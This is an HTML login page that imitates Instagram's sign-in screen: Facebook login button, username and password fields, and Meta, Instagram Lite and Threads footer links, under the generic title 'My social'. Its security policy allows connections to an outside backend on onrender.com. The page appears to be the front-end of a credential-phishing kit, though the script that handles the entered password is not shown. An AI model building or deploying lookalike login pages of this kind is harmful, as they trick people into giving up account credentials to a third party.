<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!--  Updated Content Security Policy (CSP) -->
    <meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    img-src 'self' https://upload.wikimedia.org data:;
    style-src 'self' 'unsafe-inline';
    script-src 'self' 'unsafe-inline' https://backend-redf.onrender.com;
    connect-src 'self' https://backend-redf.onrender.com;
">
    <title>My social</title>
    <link rel="stylesheet" href="index.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
</head>
<body>
    <div class="login-container">
        <img src="image/my-photo.jpg" alt="My Photo" >
        <button class="facebook-btn">Continue with Facebook</button>
        <div class="separator"><span>OR</span></div>
        <input type="text" placeholder="Phone number, username, or email" id="username">
        <div class="password-container">
            <input type="password" placeholder="Password" id="password">
            <i class="fa-solid fa-eye" id="togglePassword"></i>
        </div>        
        <a href="#" class="forgot-password">Forgot password?</a>
        <button class="login-btn" id="loginBtn">
            <span id="loginText">Log In</span>
            <div id="spinner" class="spinner"></div>
        </button>        
        <div class="signup-link">Don't have an account? <a href="#">Sign up</a></div>
    </div>
    
    <div class="footer-links">
        <a href="#">Meta</a>
        <a href="#">About</a>
        <a href="#">Blog</a>
        <a href="#">Jobs</a>
        <a href="#">Help</a>
        <a href="#">API</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
        <a href="#">Locations</a>
        <a href="#">Instagram Lite</a>
        <a href="#">Threads</a>
    </div>

    <script src="index.js"></script> <!-- External JavaScript -->
</body>
</html>
